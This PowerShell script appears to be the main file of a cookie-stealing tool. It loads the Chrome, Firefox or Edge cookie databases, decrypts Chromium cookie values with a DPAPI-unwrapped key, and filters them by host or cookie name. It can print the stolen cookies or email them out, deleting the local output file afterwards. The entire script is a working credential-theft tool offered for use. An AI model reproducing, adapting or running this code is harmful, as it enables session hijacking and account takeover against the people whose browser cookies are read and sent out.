Import-Module PSSQLite
Import-Module $PSScriptRoot\core\Banner
Import-Module $PSScriptRoot\core\Menu
Import-Module $PSScriptRoot\core\Constants
Import-Module $PSScriptRoot\core\core

Add-Type -Assembly System.Security
Show-Banner
Set-Constant


$result = Show-CookeyMenu
switch ($result) {
        0 { 
            $decKey = DPAPIDecryptKey $chromeKeyPath
            $Database = $chromeCookiePath
            $DBTable = "cookies"
            $hostcolumn = "host_key"
            $valuecolumn = "encrypted_value"
          }
        1 {
            $decKey = $null
            $Database = $firefoxCookiePath
            $DBTable = "moz_cookies"
            $hostcolumn = "host"
            $valuecolumn = "value"
          }
        2 {
            $decKey = DPAPIDecryptKey $edgeKeyPath
            $Database = $edgeCookiePath
            $DBTable = "cookies"
            $hostcolumn = "host_key"
            $valuecolumn = "encrypted_value"
          }
    }

$choice = Show-ChoicesMenu
if ($choice -ne 0)
{
   importCookieDB $Database $DBTable
   return 0
}

$query = "SELECT $hostcolumn, name, $valuecolumn, path FROM $DBTable"

$hostmenu = Show-HostMenu

if ($hostmenu -eq 1)
{
   $targethost = Read-Host "Please enter the host"
   $cookiemenu = Show-CookieNameMenu
   if ($cookiemenu -eq 1)
   {
      $targetcookie = Read-Host "Please enter the cookie name"
      $encAll = Invoke-SqliteQuery -DataSource $Database -Query $query | Where-Object {$_.$hostcolumn -eq $targethost -and $_.name -eq $targetcookie}
   }
   else
   {
      $encAll = Invoke-SqliteQuery -DataSource $Database -Query $query | Where-Object {$_.$hostcolumn -eq $targethost}
   }
   
}
else
{
   $encAll = Invoke-SqliteQuery -DataSource $Database -Query $query   
}

$out = Show-SendEmail

if ($out -eq 0)
{
   Start-Transcript -Path .\output.txt
   PrintResult $encAll $decKey $hostcolumn $valuecolumn
   Stop-Transcript
   SendEmail
   Remove-Item .\output.txt
}
else
{
   PrintResult $encAll $decKey $hostcolumn $valuecolumn
}